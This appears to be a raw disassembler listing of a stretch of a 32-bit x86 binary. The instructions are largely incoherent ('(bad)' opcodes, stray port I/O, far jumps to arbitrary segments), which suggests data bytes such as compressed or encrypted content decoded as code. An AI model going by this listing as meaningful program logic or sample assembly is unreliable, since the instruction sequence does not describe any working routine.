  412fa2:	mov    bl,0x56
  412fa4:	sub    bl,BYTE PTR [ecx-0x1f]
  412fa7:	jp     0x412f4f
  412fa9:	js     0x412ffd
  412fab:	popf   
  412fac:	daa    
  412fad:	cs jb  0x412f4f
  412fb0:	clc    
  412fb1:	cmp    al,0x6e
  412fb3:	inc    esp
  412fb4:	push   0x45
  412fb6:	imul   edx,DWORD PTR [esi],0xaf611113
  412fbc:	std    
  412fbd:	rol    DWORD PTR [ebx],cl
  412fbf:	jmp    0x108de660
  412fc4:	or     edx,DWORD PTR [ecx+0x6a1111a7]
  412fca:	dec    esi
  412fcb:	pushf  
  412fcc:	inc    BYTE PTR [edx+0x52]
  412fcf:	adc    BYTE PTR [edx+0x2bb1af6],al
  412fd5:	sbb    ebp,DWORD PTR [ebx-0x10b0da5c]
  412fdb:	mov    BYTE PTR [eax+0x64],bh
  412fde:	outs   dx,BYTE PTR ds:[esi]
  412fdf:	mov    ds:0xc33e7934,eax
  412fe4:	add    ah,BYTE PTR [ebx+ebp*4+0x7]
  412fe8:	ja     0x412fcb
  412fea:	and    ebx,esi
  412fec:	das    
  412fed:	add    bl,al
  412fef:	and    eax,0xfad95a59
  412ff4:	outs   dx,BYTE PTR ds:[esi]
  412ff5:	in     al,0x9b
  412ff7:	clc    
  412ff8:	sbb    edi,DWORD PTR [ecx]
  412ffa:	jno    0x412fc5
  412ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ffd:	(bad)  
  412ffe:	jg     0x413038
  413000:	mov    cr5,ebx
  413003:	add    eax,0xc662567c
  413008:	pop    ds
  413009:	xchg   BYTE PTR [ecx+edx*4+0x506375de],al
  413010:	mov    DWORD PTR [ecx-0x41f5b17f],ebp
  413016:	adc    al,0x19
  413018:	fld    TBYTE PTR [edx]
  41301a:	mov    ah,0x59
  41301c:	addr16 jge 0x413000
  41301f:	sbb    cl,BYTE PTR ds:0xf4618731
  413025:	imul   DWORD PTR [edx-0x14]
  413028:	into   
  413029:	(bad)  
  41302a:	jmp    0xf908:0x9ccb2884
  413031:	inc    edx
  413032:	jmp    0x2ef7:0x870e4373
  413039:	pop    edi
  41303a:	test   BYTE PTR cs:[ebp+eiz*8+0x9154300],al
  413042:	mov    ebx,0xf06476ad
  413047:	push   esi
  413048:	bound  ecx,QWORD PTR [ebp-0xed0b7e4]
  41304e:	jb     0x4130c2
  413050:	xor    BYTE PTR [esi+ecx*2-0x168ea336],al
  413057:	ins    DWORD PTR es:[edi],dx
  413058:	xor    ebp,DWORD PTR [ecx]
  41305a:	dec    eax
  41305b:	jns    0x41300b
  41305d:	pop    eax
  41305e:	mov    edi,0x706a62a0
  413063:	cmp    dh,BYTE PTR [edi]
  413065:	popa   
  413066:	jae    0x4130a2
  413068:	fcom   DWORD PTR ds:0xc76c061a
  41306e:	jne    0x4130eb
  413070:	cmp    al,0x97
  413072:	xor    BYTE PTR [edi],dl
  413074:	xchg   esi,eax
  413075:	add    BYTE PTR [ecx],ch
  413077:	jle    0x41309b
  413079:	nop
  41307a:	scas   al,BYTE PTR es:[edi]
  41307b:	test   dl,0xe0
  41307e:	dec    esi
  41307f:	xchg   DWORD PTR es:[eax],ecx
  413082:	scas   al,BYTE PTR es:[edi]
  413083:	repz mov esi,0xa6540b7d
  413089:	adc    eax,0x49ebc665
  41308e:	and    BYTE PTR [eax-0xd5a9ba4],al
  413094:	rcl    BYTE PTR [esi-0x68],1
  413097:	jmp    0xe4b14fa5
  41309c:	and    al,0xa6
  41309e:	dec    ebx
  41309f:	dec    ebp
  4130a0:	dec    eax
  4130a1:	xor    ecx,DWORD PTR [edx+esi*1+0x79f334a4]
  4130a8:	sti    
  4130a9:	fsubr  DWORD PTR [edx]
  4130ab:	sub    eax,0xf20974fd
  4130b0:	and    eax,0x50da2a82
  4130b5:	mov    eax,0x2da0fa76
  4130ba:	nop
  4130bb:	xchg   BYTE PTR [eax+0x2a],bl
  4130be:	jo     0x41311f
  4130c0:	scas   al,BYTE PTR es:[edi]
  4130c1:	jmp    FWORD PTR ds:0x73936e1c
  4130c7:	pushf  
  4130c8:	or     eax,0x2c98a91a
  4130cd:	xlat   BYTE PTR ds:[ebx]
  4130ce:	or     ebp,esp
  4130d0:	inc    cl
  4130d2:	ficom  WORD PTR [esi-0x19]
  4130d5:	bound  ebx,QWORD PTR [edi]
  4130d7:	mov    cl,0xfc
  4130d9:	test   eax,esi
  4130db:	popa   
  4130dc:	cli    
  4130dd:	call   0xa09d:0x7af9a570
  4130e4:	lods   eax,DWORD PTR ds:[esi]
  4130e5:	sbb    DWORD PTR [ebx],eax
  4130e7:	sub    DWORD PTR [edx+0x70],ecx
  4130ea:	or     eax,0x75dafd48
  4130ef:	(bad)  
  4130f0:	hlt    
  4130f1:	sbb    eax,0x8514255a
  4130f6:	into   
  4130f7:	bound  ecx,QWORD PTR [edi-0x67390a2c]
  4130fd:	pop    ebp
  4130fe:	imul   esi,eax,0x7
  413101:	mov    edi,0x4b7379e5
  413106:	xchg   ecx,eax
  413107:	xchg   BYTE PTR [ecx+0x3a],bh
  41310a:	sbb    al,0x6d
  41310c:	xchg   edi,eax
  41310d:	loop   0x41312d
  41310f:	stc    
  413110:	pop    ds
  413111:	(bad)  
  413112:	mov    ss,WORD PTR [eax+0x46]
  413115:	cmp    cl,dl
  413117:	das    
  413118:	jae    0x41316c
  41311a:	pop    eax
  41311b:	fisubr DWORD PTR [edx-0x50]
  41311e:	imul   ecx,DWORD PTR [ebx],0x67
  413121:	jo     0x4130e3
  413123:	bound  esi,QWORD PTR [edi+0x36]
  413126:	dec    eax
  413127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413128:	dec    ebp
  413129:	in     al,0xcf
  41312b:	inc    esp
  41312c:	xchg   BYTE PTR [eax+0x57],bl
  41312f:	and    dl,cl
  413131:	das    
  413132:	stos   DWORD PTR es:[edi],eax
  413133:	fdivr  DWORD PTR [ebp-0x6a]
  413136:	pop    eax
  413137:	cmp    bl,BYTE PTR [edx+ecx*8]
  41313a:	xor    eax,0x6551b71e
  41313f:	lds    esp,FWORD PTR ds:0x45eb664f
  413145:	fdiv   QWORD PTR [edx-0x27]
  413148:	ss dec edx
  41314a:	aaa    
  41314b:	std    
  41314c:	aad    0x94
  41314e:	daa    
  41314f:	mov    WORD PTR [edi+ebx*4+0x59e91905],?
  413156:	cwde   
  413157:	adc    esp,DWORD PTR ds:0xd5d194a7
  41315d:	dec    edx
  41315e:	repz cwde 
  413160:	xchg   edi,eax
  413161:	or     ecx,DWORD PTR [edx-0x6d]
  413164:	aaa    
  413165:	popa   
  413166:	mov    esi,0x3b79c7c1
  41316b:	xchg   esp,eax
  41316c:	hlt    
  41316d:	loop   0x4131db
  41316f:	push   esi
  413170:	or     DWORD PTR [edx+0x3957829b],ebp
  413176:	in     al,dx
  413177:	add    ch,ah
  413179:	fwait
  41317a:	sub    eax,0x19909400
  41317f:	ja     0x4131c5
  413181:	inc    esp
  413182:	xchg   BYTE PTR [ebx+edx*2-0xbd7f37d],ah
  413189:	and    ebp,edi
  41318b:	ins    DWORD PTR es:[edi],dx
  41318c:	pop    esi
  41318d:	jg     0x41315a
  41318f:	sbb    eax,0x80428976
  413194:	pop    es
  413195:	in     eax,0x3
  413197:	(bad)  
  413198:	ins    BYTE PTR es:[edi],dx
  413199:	jnp    0x4131cf
  41319b:	(bad)  
  41319c:	fwait
  41319d:	call   0xbb36:0x666bdf9d
  4131a4:	je     0x4131df
  4131a6:	stos   DWORD PTR es:[edi],eax
  4131a7:	pop    ebp
  4131a8:	mov    DWORD PTR [ebx-0xd7f0d9b],0x6acb7683
  4131b2:	mov    ebx,DWORD PTR [esi-0x4a]
  4131b5:	pop    edx
  4131b6:	dec    ebx
  4131b7:	dec    ebx
  4131b8:	nop
  4131b9:	test   al,0x8
  4131bb:	mov    cl,0x33
  4131bd:	add    al,0xc5
  4131bf:	push   es
  4131c0:	sbb    esi,esp
  4131c2:	pop    ecx
  4131c3:	mov    ss,WORD PTR [ecx-0x77]
  4131c6:	or     al,0x3c
  4131c8:	mov    ds:0xbf4bdef8,al
  4131cd:	outs   dx,DWORD PTR ds:[esi]
  4131ce:	(bad)  
  4131cf:	jmp    DWORD PTR [edx-0x1f]
  4131d2:	lods   eax,DWORD PTR ds:[esi]
  4131d3:	fs div esp
  4131d6:	inc    ebx
  4131d7:	or     eax,0x8a698576
  4131dc:	dec    BYTE PTR [eax]
  4131de:	push   es
  4131df:	jnp    0x413185
  4131e1:	sbb    al,0xb6
  4131e3:	in     eax,dx
  4131e4:	xor    ebp,0x7f020640
  4131ea:	(bad)  
  4131ec:	leave  
  4131ed:	mov    ah,dl
  4131ef:	mov    al,0xe0
  4131f1:	mov    ch,0xd3
  4131f3:	mov    ds:0x1f6017dc,eax
  4131f8:	push   cs
  4131f9:	(bad)  
  4131fa:	push   edx
  4131fb:	shl    BYTE PTR [esi+eax*1+0x6572c63f],1
  413202:	pop    eax
  413203:	or     ch,BYTE PTR [ebx]
  413205:	inc    edx
  413206:	fadd   DWORD PTR [edi-0x380745cb]
  41320c:	sti    
  41320d:	ins    DWORD PTR es:[edi],dx
  41320e:	bound  edi,QWORD PTR [eax]
  413210:	loope  0x4131b5
  413212:	call   0x201bbd28
  413217:	loop   0x413270
  413219:	int3   
  41321a:	pop    edi
  41321b:	pop    esi
  41321c:	adc    al,0x34
  41321e:	mov    ah,0x72
  413220:	push   es
  413221:	xchg   dl,bl
  413223:	adc    eax,0x9e8a17fb
  413228:	adc    edx,DWORD PTR [edx+0x12]
  41322b:	lods   eax,DWORD PTR ds:[esi]
  41322c:	bound  ebx,QWORD PTR [esi]
  41322e:	adc    DWORD PTR [ebp+0x22],ebp
  413231:	fwait
  413232:	jl     0x41321b
  413234:	in     al,dx
  413235:	ins    DWORD PTR es:[edi],dx
  413236:	scas   eax,DWORD PTR es:[edi]
  413237:	pop    edi
  413238:	call   0x80221634
  41323d:	lock dec edx
  41323f:	inc    esp
  413240:	push   ecx
  413241:	addr16 jg 0x413247
  413244:	mov    WORD PTR [edx+0x3ea431a0],gs
  41324a:	and    al,0x2f
  41324c:	dec    ebx
  41324d:	mov    ch,dh
  41324f:	es (bad) 
  413251:	xchg   esp,eax
  413252:	(bad)  
  413253:	call   0xc9628d44
  413258:	jnp    0x413230
  41325a:	dec    ebp
  41325b:	or     ebx,DWORD PTR [eax-0x63]
  41325e:	mov    ebx,0xa16a19fd
  413263:	aaa    
  413264:	popf   
  413265:	jbe    0x41323b
  413267:	mov    esi,0xf94e9cf5
  41326c:	inc    edx
  41326d:	or     BYTE PTR [ebp-0x33a660e7],dl
  413273:	jbe    0x4132b7
  413275:	lods   eax,DWORD PTR ds:[esi]
  413276:	cmp    DWORD PTR [edi-0x2d],ebx
  413279:	sub    al,0xfa
  41327b:	mov    ebx,0xf62d9a64
  413280:	push   es
  413281:	adc    al,0x63
  413283:	ja     0x4132c8
  413285:	push   edx
  413286:	push   edx
  413287:	adc    ecx,edi
  413289:	loopne 0x413278
  41328b:	stc    
  41328c:	dec    edx
  41328d:	in     eax,dx
  41328e:	popf   
  41328f:	xor    cl,BYTE PTR [edi]
  413291:	fnstsw WORD PTR [esi*4-0x1544e731]
  413298:	fisubr WORD PTR [edi+0x1ec193b5]
  41329e:	sub    eax,0x5bb7177f
  4132a3:	mov    ah,0x15
  4132a5:	mov    bl,0x21
  4132a7:	imul   ebp,DWORD PTR [edx+0x2d8bea9f],0x5ba13ae8
  4132b1:	or     ah,bh
  4132b3:	or     ah,0x4a
  4132b6:	mov    ds:0x49c2d90,al
  4132bb:	xchg   esi,eax
  4132bc:	fwait
  4132bd:	data16 shl BYTE PTR [ebx-0x4d],0x91
  4132c2:	ds js  0x413246
  4132c5:	iret   
  4132c6:	and    ah,BYTE PTR [edi]
  4132c8:	adc    al,0x9d
  4132ca:	pop    esp
  4132cb:	ins    BYTE PTR es:[edi],dx
  4132cc:	stos   BYTE PTR es:[edi],al
  4132cd:	popf   
  4132ce:	xchg   esi,eax
  4132cf:	inc    edi
  4132d0:	aad    0x2e
  4132d2:	sbb    cl,0xbb
  4132d5:	sahf   
  4132d6:	les    edx,FWORD PTR [eax]
  4132d8:	imul   esi,DWORD PTR [edx-0x6f4a45eb],0x6319a16f
  4132e2:	sub    esp,DWORD PTR [ecx+0x6a]
  4132e5:	inc    edx
  4132e6:	push   ds
  4132e7:	mov    dh,0xf2
  4132e9:	jl     0x4132fa
  4132eb:	stos   BYTE PTR es:[edi],al
  4132ec:	mov    eax,ds:0xdac889cd
  4132f1:	int    0x29
  4132f3:	or     bh,bh
  4132f5:	iret   
  4132f6:	rol    BYTE PTR [esi-0x59d79541],0xb4
  4132fd:	test   al,0x2a
  4132ff:	lods   al,BYTE PTR ds:[esi]
  413300:	lods   eax,DWORD PTR ds:[esi]
  413301:	pop    edx
  413302:	es loope 0x4132d0
  413305:	aaa    
  413306:	je     0x4132c9
  413308:	mov    BYTE PTR [ecx+0x31],dh
  41330b:	jo     0x4132f4
  41330d:	sub    DWORD PTR [ebx-0xfafcf5],esp
  413313:	sbb    eax,0xe0373d35
  413318:	and    al,0x32
  41331a:	stos   DWORD PTR es:[edi],eax
  41331b:	sub    eax,0x83db77dc
  413320:	mov    ah,0x94
  413322:	lahf   
  413323:	mov    ebp,ebp
  413325:	sbb    DWORD PTR [eax+0x7d035d79],esp
  41332b:	lahf   
  41332c:	clc    
  41332d:	adc    bh,BYTE PTR [ecx+0x79]
  413330:	call   0xa7f656a6
  413335:	test   DWORD PTR [esi],ebx
  413337:	push   eax
  413338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413339:	mov    cl,0xa8
  41333b:	loopne 0x4132eb
  41333d:	std    
  41333e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333f:	mov    eax,ds:0x44315d4f
  413344:	fucomi st,st(4)
  413346:	adc    DWORD PTR [ebx],ecx
  413348:	sbb    esp,DWORD PTR [edx+0x67]
  41334b:	jno    0x413384
  41334d:	mov    al,0xe4
  41334f:	mov    bl,0xc4
  413351:	mov    dh,0x46
  413353:	daa    
  413354:	push   esi
  413355:	pop    esi
  413356:	mov    ds:0x5feb52c4,al
  41335b:	imul   edx,DWORD PTR [ebx-0x77a4354],0x76
  413362:	add    eax,0xf1dc183b
  413367:	cmp    DWORD PTR [eax-0x5872de5f],ecx
  41336d:	pop    ecx
  41336e:	shl    BYTE PTR [ebp+0x2ab76229],0x44
  413375:	popf   
  413376:	imul   BYTE PTR [esi]
  413378:	(bad)  
  413379:	(bad)  
  41337a:	mov    ah,0x12
  41337c:	sahf   
  41337d:	and    cl,al
  41337f:	pop    edi
  413380:	push   ebx
  413381:	sbb    eax,0x78b72828
  413386:	call   0x46238d09
  41338b:	pop    ss
  41338c:	jl     0x413321
  41338e:	jae    0x413370
  413390:	or     eax,eax
  413392:	or     eax,0xb80de007
  413397:	cwde   
  413398:	cmp    ebp,0x3fcb4452
  41339e:	loopne 0x413382
  4133a0:	sbb    bl,BYTE PTR [ecx+0x7e501175]
  4133a6:	dec    ebp
  4133a7:	retf   0xb20d
  4133aa:	jnp    0x4133d5
  4133ac:	inc    edx
  4133ad:	sbb    eax,0x21919a6c
  4133b2:	xlat   BYTE PTR ds:[ebx]
  4133b3:	jg     0x4133ed
  4133b5:	push   0x4b
  4133b7:	clc    
  4133b8:	jle    0x413432
  4133ba:	ja     0x41338b
  4133bc:	add    bh,BYTE PTR ds:0x2c46bc8a
  4133c2:	popa   
  4133c3:	pop    ebx
  4133c4:	in     eax,0x7e
  4133c6:	and    dh,BYTE PTR [edi]
  4133c8:	mov    dh,0xe4
  4133ca:	inc    ebp
  4133cb:	mov    bh,0x64
  4133cd:	push   es
  4133ce:	pop    es
  4133cf:	ficom  WORD PTR [ecx]
  4133d1:	xchg   ebx,eax
  4133d2:	adc    al,0xc2
  4133d4:	std    
  4133d5:	(bad)  
  4133d7:	fbld   TBYTE PTR [eax+0x48]
  4133da:	mov    ebp,0xe4f87f4b
  4133df:	or     eax,0x5db2f3de
  4133e4:	dec    edi
  4133e5:	test   DWORD PTR [eax-0x66656d75],edi
  4133eb:	adc    BYTE PTR [esp+eax*8-0x7602638a],bl
  4133f2:	inc    esp
  4133f3:	aas    
  4133f4:	cli    
  4133f5:	shl    DWORD PTR [ecx+0x79],cl
  4133f8:	(bad)  
  4133f9:	in     al,dx
  4133fa:	mov    ah,0xe3
  4133fc:	pushf  
  4133fd:	mov    DWORD PTR [esi+edx*2-0x5df414a5],edx
  413404:	xchg   BYTE PTR [ecx+eiz*4+0x1866641d],ch
  41340b:	mov    ebx,0x9c7f83f7
  413410:	pop    eax
  413411:	test   eax,0x7d556360
  413416:	ins    BYTE PTR es:[edi],dx
  413417:	cmp    BYTE PTR [edx+edi*2],0x9a
  41341b:	sub    al,0x9a
  41341d:	xor    DWORD PTR [ebp-0x70a700d7],0x1a18adc3
  413427:	imul   edx,DWORD PTR [eax],0x41
  41342a:	mov    bp,0x63d8
  41342e:	adc    cl,cl
  413430:	lds    edi,FWORD PTR [edi+0x14]
  413433:	and    al,0x9c
  413435:	lea    esp,[ebp+ecx*1-0xf]
  413439:	cmp    BYTE PTR [ecx+esi*4+0x741edada],0x3
  413441:	loop   0x4133ca
  413443:	clc    
  413444:	arpl   WORD PTR [edx+0x31cb85c4],sp
  41344a:	mov    DWORD PTR [edi+eiz*1],ebp
  41344d:	cmp    al,0x41
  41344f:	ins    DWORD PTR es:[edi],dx
  413450:	ins    BYTE PTR es:[edi],dx
  413451:	cdq    
  413452:	inc    edx
  413453:	(bad)  
  413455:	sub    al,0x2b
  413457:	dec    eax
  413458:	or     edx,DWORD PTR [eax]
  41345a:	pop    esi
  41345b:	leave  
  41345c:	jl     0x413459
  41345e:	jne    0x41341d
  413460:	or     al,0x15
  413462:	outs   dx,BYTE PTR ds:[si]
  413464:	mov    ebx,0x16e2c3fd
  413469:	jl     0x4134a0
  41346b:	das    
  41346c:	or     DWORD PTR [ecx],ebx
  41346e:	xor    eax,0xb354ce74
  413473:	xchg   ecx,eax
  413474:	or     BYTE PTR [edx-0x5c],bl
  413477:	popf   
  413478:	stc    
  413479:	sub    eax,0x106994e5
  41347e:	retf   
  41347f:	adc    esp,DWORD PTR [edx+0x58]
  413482:	dec    edi
  413483:	xchg   BYTE PTR [edx],cl
  413485:	and    ecx,DWORD PTR [edx-0x7e]
  413488:	out    dx,al
  413489:	cld    
  41348a:	scas   al,BYTE PTR es:[edi]
  41348b:	adc    DWORD PTR [edx+0x7b],ebx
  41348e:	jae    0x4134ab
  413490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413491:	in     al,0x25
  413493:	fs sub eax,0xe96c48c9
  413499:	xor    al,0xc9
  41349b:	test   ecx,esi
  41349d:	and    al,0x27
  41349f:	cli    
  4134a0:	dec    esi
  4134a1:	jmp    0x1102af89
  4134a6:	out    dx,al
  4134a7:	dec    ecx
  4134a8:	in     eax,0x46
  4134aa:	xchg   esi,eax
  4134ab:	loop   0x4134a0
  4134ad:	ret    
  4134ae:	jmp    FWORD PTR [esi]
  4134b0:	inc    esp
  4134b1:	ret    0x6609
  4134b4:	in     eax,dx
  4134b5:	push   eax
  4134b6:	pop    ss
  4134b7:	call   0x7ef16a12
  4134bc:	sbb    al,0x75
  4134be:	int3   
  4134bf:	ss adc al,0xc5
  4134c2:	(bad)  [ebx]
  4134c4:	push   0xfffffff7
  4134c6:	jl     0x413499
  4134c8:	mov    edx,DWORD PTR [ecx]
  4134ca:	mov    ch,0x61
  4134cc:	or     BYTE PTR [esi+0x4c0d81d],bl
  4134d2:	scas   al,BYTE PTR es:[edi]
  4134d3:	dec    eax
  4134d4:	call   0xb87e:0xe6bff698
  4134db:	push   ebp
  4134dc:	call   0xb9d0:0x11cd7c9a
  4134e3:	or     dl,BYTE PTR [ecx-0x7289defe]
  4134e9:	les    ebp,FWORD PTR [edi+0x34]
  4134ec:	inc    eax
  4134ed:	add    ch,BYTE PTR [esi-0x2e]
  4134f0:	xchg   ecx,eax
  4134f1:	sub    eax,0x5a7abe7e
  4134f6:	dec    esp
  4134f7:	mov    WORD PTR [ecx-0x25],ds
  4134fa:	dec    ebp
  4134fb:	mov    ds:0xe02e3d25,al
  413500:	lods   eax,DWORD PTR ds:[esi]
  413501:	inc    ebp
  413502:	retf   0x917b
  413505:	les    edx,FWORD PTR [ecx]
  413507:	popa   
  413508:	dec    esp
  413509:	add    eax,0x71424a9a
  41350e:	inc    DWORD PTR [edi]
  413510:	in     al,0xbd
  413512:	mov    cl,0x26
  413514:	inc    edi
  413515:	adc    al,BYTE PTR [edi+0x79e2e1a1]
  41351b:	mov    ds:0xea9c8344,al
  413520:	mov    WORD PTR ds:0xde5a58eb,fs
  413526:	and    al,0x9f
  413528:	add    edx,DWORD PTR [eax+0x95157dd]
  41352e:	shl    BYTE PTR [esi-0x4131550e],0x8d
  413535:	stos   DWORD PTR es:[edi],eax
  413536:	ja     0x413522
  413538:	es jg  0x413586
  41353b:	outs   dx,DWORD PTR ds:[esi]
  41353c:	xor    bh,ch
  41353e:	rol    dl,cl
  413540:	(bad)  
  413541:	lock jo 0x4135af
  413544:	adc    esp,DWORD PTR es:[edx]
  413547:	or     DWORD PTR [ebx],ebp
  413549:	pop    esi
  41354a:	imul   ebx,DWORD PTR [ebx],0xffffff80
  41354d:	jmp    0x413585
  41354f:	mov    ds:0xd29d70a7,al
  413554:	cmc    
  413555:	cld    
  413556:	cmp    BYTE PTR [edx],bl
  413558:	dec    esi
  413559:	add    esp,edi
  41355b:	push   cs
  41355c:	push   ebx
  41355d:	mov    DWORD PTR [edi+edx*4],eax
  413560:	fsub   DWORD PTR [ecx+0x2a]
  413563:	mov    ah,BYTE PTR fs:[ebx+eiz*8-0x64]
  413568:	aam    0xb
  41356a:	push   ebp
  41356b:	sbb    dl,BYTE PTR [ebp+0x49]
  41356e:	jbe    0x41355a
  413570:	xchg   DWORD PTR [edi],esp
  413572:	pop    es
  413573:	lods   al,BYTE PTR ds:[esi]
  413574:	fwait
  413575:	retf   
  413576:	add    edi,eax
  413578:	mov    al,ds:0xd3ce00f8
  41357d:	jns    0x41355d
  41357f:	push   ss
  413580:	cmp    BYTE PTR [edx-0x4528d281],0x67
  413587:	in     eax,0x1e
  413589:	ror    DWORD PTR [eax+0x2c7fce32],cl
  41358f:	ror    DWORD PTR [ecx+0x51],cl
  413592:	into   
  413593:	mov    dl,BYTE PTR [esi+0x5f8e92ec]
  413599:	or     BYTE PTR [ebx-0x4f450a9f],dh
  41359f:	xor    al,0xd3
  4135a1:	in     eax,dx
  4135a2:	aad    0x85
  4135a4:	mov    ah,0xd7
  4135a6:	lahf   
  4135a7:	or     eax,0x311dd293
  4135ac:	sub    cl,BYTE PTR [ecx]
  4135ae:	(bad)
  4135b1:	int3   
  4135b2:	bound  ebx,QWORD PTR [edi+0x4ecc2015]
  4135b8:	push   ecx
  4135b9:	out    dx,eax
  4135ba:	sbb    BYTE PTR [edx],dh
  4135bc:	inc    ecx
  4135bd:	int3   
  4135be:	mov    ah,0x3e
  4135c0:	scas   eax,DWORD PTR es:[edi]
  4135c1:	mov    ebx,0xae7f9112
  4135c6:	sub    al,0x89
  4135c8:	(bad)  
  4135c9:	daa    
  4135ca:	xchg   edi,eax
  4135cb:	xchg   edx,eax
  4135cc:	std    
  4135cd:	ja     0x41361b
  4135cf:	(bad)  
  4135d0:	out    0x3c,al
  4135d2:	leave  
  4135d3:	mov    edx,ecx
  4135d5:	pop    es
  4135d6:	out    0xd4,eax
  4135d8:	jg     0x413642
  4135da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135db:	cmp    cl,dl
  4135dd:	into   
  4135de:	add    DWORD PTR [ebx-0x44],esi
  4135e1:	into   
  4135e2:	mov    ch,0xe6
  4135e4:	push   ebx
  4135e5:	and    BYTE PTR ds:0xe39d7ca1,dl
  4135eb:	sbb    al,0x41
  4135ed:	push   cs
  4135ee:	mov    bh,0xf5
  4135f0:	jb     0x41366f
  4135f2:	adc    bh,BYTE PTR [ebx+0x1a1c1d8e]
  4135f8:	jecxz  0x413642
  4135fa:	(bad)  
  4135fc:	fistp  WORD PTR [edx]
  4135fe:	dec    esi
  4135ff:	mov    BYTE PTR [eax-0x3bcd3395],ch
  413605:	xor    BYTE PTR [edx+0x74],0xe7
  413609:	test   DWORD PTR [edi-0x58f85211],eax
  41360f:	sbb    BYTE PTR [edi+0x45],dh
  413612:	nop
  413613:	imul   esi,DWORD PTR [eax],0xffffffb4
  413616:	push   ebx
  413617:	push   ss
  413618:	test   BYTE PTR [esi],bl
  41361a:	xor    al,0xc
  41361c:	push   ss
  41361d:	ret    
  41361e:	lds    esp,FWORD PTR [eax]
  413620:	cmovle ebp,edx
  413623:	add    esi,DWORD PTR [edi-0x284357d3]
  413629:	pop    ds
  41362a:	xchg   ebp,eax
  41362b:	pop    ss
  41362c:	cdq    
  41362d:	mov    bh,0x6c
  41362f:	imul   ebp,DWORD PTR [edx],0xe
  413632:	mov    dl,0xae
  413634:	retf   
  413635:	cmp    dh,BYTE PTR ds:0x43899fe4
  41363b:	loope  0x413666
  41363d:	ret    0x1805
  413640:	jbe    0x413681
  413642:	(bad)  
  413643:	test   BYTE PTR [edx-0xfefcb0a],0xf1
  41364a:	fwait
  41364b:	jo     0x413645
  41364d:	jge    0x4136be
  41364f:	cmp    al,0x3a
  413651:	push   edx
  413652:	outs   dx,BYTE PTR ds:[esi]
  413653:	xor    DWORD PTR [edx],ecx
  413655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413656:	sub    DWORD PTR [edx-0x35],esi
  413659:	pop    esi
  41365a:	jne    0x41364d
  41365c:	dec    ebp
  41365d:	popa   
  41365e:	shl    esi,0xac
  413661:	push   cs
  413662:	inc    esp
  413663:	dec    ebp
  413664:	ds in  eax,0x72
  413667:	mov    DWORD PTR [edx-0x47],ecx
  41366a:	inc    ebp
  41366b:	mov    ah,0x61
  41366d:	test   eax,0xe320dcfc
  413672:	adc    eax,0x692d0ede
  413677:	or     edx,ebx
  413679:	in     al,0xc0
  41367b:	call   0xc6f6c956
  413680:	adc    BYTE PTR ds:0xa1102632,ah
  413686:	sub    eax,0x43a6efb0
  41368b:	inc    ecx
  41368c:	cwde   
  41368d:	pop    ecx
  41368e:	dec    cx
  413690:	gs adc al,0x6a
  413693:	cmc    
  413694:	ss jns 0x4136f8
  413697:	in     eax,0x4c
  413699:	mov    ch,0x28
  41369b:	call   0xe22f:0xb1a6ffd9
  4136a2:	into   
  4136a3:	fadd   QWORD PTR [esi-0x21]
  4136a6:	mov    eax,edx
  4136a8:	add    BYTE PTR [edx+0x6c6d7638],al
  4136ae:	rcr    esi,0xf0
  4136b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b2:	shr    DWORD PTR [edi-0x695ed436],0x4d
  4136b9:	xchg   BYTE PTR [edi],al
  4136bb:	jbe    0x41364a
  4136bd:	dec    ecx
  4136be:	adc    al,0xc4
  4136c0:	icebp  
  4136c1:	ss out dx,eax
  4136c3:	ds pop esi
  4136c5:	cdq    
  4136c6:	adc    DWORD PTR [eax-0x6c411166],edx
  4136cc:	in     eax,dx
  4136cd:	xchg   esp,eax
  4136ce:	pop    eax
  4136cf:	push   eax
  4136d0:	fs jp  0x41371d
  4136d3:	jmp    0xc0e114a7
  4136d8:	mov    ch,0xa8
  4136da:	div    BYTE PTR [edi+esi*4+0x2a9065b5]
  4136e1:	push   ss
  4136e2:	or     cl,BYTE PTR [ecx+ebx*2-0x7e6d1227]
  4136e9:	js     0x4136c2
  4136eb:	pop    eax
  4136ec:	dec    edx
  4136ed:	push   ebp
  4136ee:	xor    eax,0xb857638
  4136f3:	cwde   
  4136f4:	sub    cl,BYTE PTR [edi]
  4136f6:	stos   DWORD PTR es:[edi],eax
  4136f7:	inc    ecx
  4136f8:	gs xor al,0x6d
  4136fb:	repz pop eax
  4136fd:	retf   0xc141
  413700:	dec    esp
  413701:	pop    esp
  413702:	fstp   QWORD PTR [eax-0x35dc5fdb]
  413708:	js     0x41370e
  41370a:	push   ebp
  41370b:	add    bl,0x6a
  41370e:	jle    0x4136ce
  413710:	fwait
  413711:	mov    esi,0x3dc56b0c
  413716:	sahf   
  413717:	push   cs
  413718:	dec    esp
  413719:	jnp    0x4136c6
  41371b:	xchg   esp,eax
  41371c:	mov    ds:0x5d302945,eax
  413721:	pop    edx
  413722:	push   0x935b8116
  413727:	or     eax,0xb05be659
  41372c:	shr    esp,0x44
  41372f:	(bad)  
  413731:	mov    dl,0xd5
  413733:	js     0x4136d0
  413735:	imul   ebp,DWORD PTR ds:0x7df8904f,0xbcce654a
  41373f:	fwait
  413740:	dec    ebx
  413741:	dec    ebp
  413742:	ja     0x41371e
  413744:	jmp    0x413730
  413746:	inc    edx
  413747:	adc    al,dl
  413749:	mov    eax,ds:0x891086a5
  41374e:	adc    ebp,DWORD PTR [eax]
  413750:	xor    al,0xb2
  413752:	jg     0x413737
  413754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413755:	mov    ah,0x51
  413757:	lods   al,BYTE PTR ds:[esi]
  413758:	mov    ds:0xe1644a0b,eax
  41375d:	add    BYTE PTR [ebp-0x452e96bc],ch
  413763:	add    eax,0x5949cb4a
  413768:	fucom  st(3)
  41376a:	push   ds
  41376b:	pop    ebp
  41376c:	(bad)  
  41376d:	pop    edi
  41376e:	jns    0x4137d8
  413770:	sbb    DWORD PTR [eax+eax*1+0x64],0xffffffce
  413775:	pop    ds
  413776:	push   esp
  413777:	fwait
  413778:	rcr    DWORD PTR [ecx],0x16
  41377b:	dec    esi
  41377c:	push   esi
